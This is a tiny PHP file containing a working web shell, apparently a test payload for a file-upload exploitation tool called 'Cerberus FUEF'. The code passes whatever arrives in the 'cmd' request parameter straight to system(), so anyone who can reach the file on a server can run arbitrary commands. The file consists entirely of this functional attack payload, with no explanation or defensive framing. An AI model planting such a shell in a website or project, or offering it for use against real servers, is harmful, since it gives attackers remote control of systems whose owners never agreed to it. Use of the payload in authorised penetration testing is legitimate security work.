<?php
// Simple PHP Command Shell
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
}
?>
<!-- Cerberus FUEF Test Payload -->
